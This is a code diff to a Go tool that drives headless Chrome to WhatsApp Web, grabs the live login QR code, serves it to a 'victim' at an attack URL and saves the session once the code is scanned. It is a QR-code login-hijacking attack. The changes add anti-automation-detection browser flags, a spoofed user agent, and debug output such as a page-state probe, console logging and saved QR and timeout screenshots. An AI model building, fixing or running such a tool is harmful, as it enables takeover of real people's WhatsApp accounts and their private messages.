@@ -2,6 +2,7 @@ package whatsapp
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"encoding/base64"
 	"encoding/json"
@@ -16,6 +17,7 @@ import (
 	"time"
 
 	"github.com/chromedp/chromedp"
+	"github.com/chromedp/cdproto/runtime"
 	"programa/utils"
 )
 
@@ -31,25 +33,25 @@ var (
 	reloadBtnSelector = "button[aria-label='Scan QR code']"
 )
 
-const sessionDetectJS = `
-(() => {
-	const canvases = document.querySelectorAll('canvas');
-	let hasQR = false;
-	for (const c of canvases) {
-		if (c.offsetParent !== null && c.width > 100) { hasQR = true; break; }
-	}
-	if (hasQR) return false;
-	const checks = [
-		'div[data-testid="chat-list"]',
-		'div[data-testid="conversation-panel-header"]',
-		'div[data-testid="conversation-panel"]',
-		'header[data-testid="conversation-header"]',
-		'div[role="navigation"]',
-		'div[aria-label*="Chat list"]',
-		'div[aria-label*="Search"]',
-		'header',
-	];
-	return checks.some(function(s){return document.querySelector(s)});
+const sessionDetectJS = `!!document.querySelector('header')`
+
+const debugPageStateJS = `
+(function() {
+	var r = {};
+	try { r.url = location.href; } catch(e) {}
+	try { r.title = document.title; } catch(e) {}
+	try { r.canvasCount = document.querySelectorAll('canvas').length; } catch(e) {}
+	try {
+		var cs = document.querySelectorAll('canvas');
+		for(var i=0;i<cs.length;i++) {
+			if(cs[i].offsetParent!==null && cs[i].width>50) r.visibleCanvas = true;
+		}
+	} catch(e) {}
+	try { r.headerCount = document.querySelectorAll('header').length; } catch(e) {}
+	try {
+		r.bodyPreview = document.body.innerText.substring(0,200).replace(/\\n/g,' ');
+	} catch(e) {}
+	return JSON.stringify(r);
 })()
 `
 
@@ -216,6 +218,23 @@ func launchAttack(cfg attackCfg) {
 	tabCtx, tabCancel := chromedp.NewContext(allocCtx)
 	defer tabCancel()
 
+	chromedp.ListenTarget(tabCtx, func(ev interface{}) {
+		switch e := ev.(type) {
+		case *runtime.EventConsoleAPICalled:
+			if e.Type == "error" || e.Type == "warning" {
+				var args []string
+				for _, a := range e.Args {
+					args = append(args, fmt.Sprintf("%v", a))
+				}
+				fmt.Printf("\n%s[CONSOLE-%s] %s%s\n", utils.Red, e.Type, strings.Join(args, " "), utils.Reset)
+			}
+		case *runtime.EventExceptionThrown:
+			if e.ExceptionDetails != nil {
+				fmt.Printf("\n%s[EXCEPTION] %s%s\n", utils.Red, e.ExceptionDetails.Error(), utils.Reset)
+			}
+		}
+	})
+
 	if err := chromedp.Run(tabCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
 		fmt.Printf("%s[!] Navigation failed: %v%s\n", utils.Red, err, utils.Reset)
 		utils.PauseForInput()
@@ -262,18 +281,13 @@ func launchAttack(cfg attackCfg) {
 
 	fmt.Printf("\n%s[+] Server: %s%s\n", utils.Green, attackURL, utils.Reset)
 	fmt.Printf("%s[+] Local:  %s%s\n", utils.Green, localURL, utils.Reset)
-
-	fmt.Printf("%s[+] Opening %s in your browser...%s\n", utils.Yellow, localURL, utils.Reset)
-	openErr := utils.OpenURL(localURL)
-	if openErr != nil {
-		exec.Command("zen-browser", "--new-tab", localURL).Start()
-	}
-
+	fmt.Printf("%s[+] Open %s in your browser manually%s\n", utils.Yellow, localURL, utils.Reset)
 	fmt.Printf("%s[+] Waiting for victim to scan the QR code...\n\n%s", utils.Yellow, utils.Reset)
 
 	start := time.Now()
 	timeout := 10 * time.Minute
 	sessionCaptured := false
+	var qrSaved bool
 
 	for time.Since(start) < timeout {
 		select {
@@ -283,6 +297,17 @@ func launchAttack(cfg attackCfg) {
 		}
 
 		captureQR(tabCtx, &qrMu, &currentQR)
+
+		if !qrSaved {
+			qrMu.Lock()
+			if len(currentQR) > 500 {
+				os.MkdirAll(wwwDir, 0755)
+				os.WriteFile(filepath.Join(wwwDir, "debug_qr.png"), currentQR, 0644)
+				qrSaved = true
+				fmt.Printf("%s[+] QR saved to %s/debug_qr.png (size: %d bytes)%s\n", utils.Green, wwwDir, len(currentQR), utils.Reset)
+			}
+			qrMu.Unlock()
+		}
 
 		var dummy string
 		var reloadExists bool
@@ -294,11 +319,23 @@ func launchAttack(cfg attackCfg) {
 		}
 
 		var hasSession bool
-		chromedp.Run(tabCtx, chromedp.Evaluate(sessionDetectJS, &hasSession))
+		err := chromedp.Run(tabCtx, chromedp.Evaluate(sessionDetectJS, &hasSession))
+		if err != nil {
+			fmt.Printf("%s[!] Session check error: %v%s\n", utils.Red, err, utils.Reset)
+		}
 		if hasSession {
 			fmt.Printf("\n%s[+] SESSION CAPTURED! Victim scanned the QR code!%s\n", utils.Green, utils.Reset)
 			sessionCaptured = true
 			break
+		}
+
+		if time.Since(start).Seconds() > 3 {
+			var pageState string
+			if err := chromedp.Run(tabCtx, chromedp.Evaluate(debugPageStateJS, &pageState)); err == nil && len(pageState) > 0 {
+				fmt.Printf("\r%s[%s] %s%s", utils.Yellow, time.Since(start).Round(time.Second), pageState, utils.Reset)
+			} else {
+				fmt.Printf("\r%s[%s] eval error: %v        %s", utils.Yellow, time.Since(start).Round(time.Second), err, utils.Reset)
+			}
 		}
 
 		time.Sleep(time.Second)
@@ -310,6 +347,12 @@ func launchAttack(cfg attackCfg) {
 		saveSession(tmpDir, "chromium", "https://web.whatsapp.com")
 	} else {
 		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
+		var ss []byte
+		if err := chromedp.Run(tabCtx, chromedp.FullScreenshot(&ss, 90)); err == nil && len(ss) > 0 {
+			os.MkdirAll(wwwDir, 0755)
+			os.WriteFile(filepath.Join(wwwDir, "debug_timeout.png"), ss, 0644)
+			fmt.Printf("%s[+] Timeout screenshot saved to %s/debug_timeout.png%s\n", utils.Green, wwwDir, utils.Reset)
+		}
 	}
 
 	utils.PauseForInput()
@@ -336,8 +379,12 @@ func captureQR(tabCtx context.Context, qrMu *sync.Mutex, currentQR *[]byte) {
 		decoded, decErr := base64.StdEncoding.DecodeString(b64)
 		if decErr == nil && len(decoded) > 500 && isPNG(decoded) {
 			qrMu.Lock()
+			changed := len(*currentQR) > 0 && !bytes.Equal(*currentQR, decoded)
 			*currentQR = decoded
 			qrMu.Unlock()
+			if changed {
+				fmt.Printf("%s[!] QR changed%s\n", utils.Blue, utils.Reset)
+			}
 			return
 		}
 	}
@@ -381,11 +428,15 @@ func findChrome() string {
 
 func startChrome(binary, userDir string) (context.Context, context.CancelFunc, error) {
 	opts := append(chromedp.DefaultExecAllocatorOptions[:],
-		chromedp.NoSandbox,
+		chromedp.Flag("headless", "new"),
 		chromedp.Flag("disable-blink-features", "AutomationControlled"),
 		chromedp.Flag("disable-background-timer-throttling", true),
 		chromedp.Flag("disable-renderer-backgrounding", true),
-		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"),
+		chromedp.Flag("disable-background-networking", false),
+		chromedp.Flag("enable-automation", false),
+		chromedp.Flag("lang", "en"),
+		chromedp.WindowSize(1920, 1080),
+		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
 		chromedp.UserDataDir(userDir),
 	)
 	if binary != "" {
